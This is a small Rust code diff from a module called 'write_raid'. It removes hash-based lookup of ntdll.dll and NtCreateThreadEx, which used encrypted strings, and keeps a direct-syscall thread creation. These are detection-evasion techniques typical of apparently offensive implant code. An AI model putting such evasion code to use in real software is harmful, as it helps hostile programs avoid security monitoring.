@@ -970,15 +970,7 @@ mod write_raid {
             let thread_proc: extern "system" fn(*mut std::ffi::c_void) -> u32 =
                 std::mem::transmute(write_raid_thread_entry as usize);
 
-            let ntdll_hash = pe_resolve::hash_str(
-                &string_crypt::enc_str!("ntdll.dll\0"),
-            );
-            let ntdll_base = pe_resolve::get_module_handle_by_hash(ntdll_hash)
-                .ok_or_else(|| anyhow::anyhow!("ntdll not found"))?;
-
-            let create_thread_hash = pe_resolve::hash_str(
-                &string_crypt::enc_str!("NtCreateThreadEx\0"),
-            );
+            const THREAD_WAIT_ACCESS: u64 = 0x0042;
 
             let mut thread_handle: u64 = 0;
             let create_status = crate::syscall!(
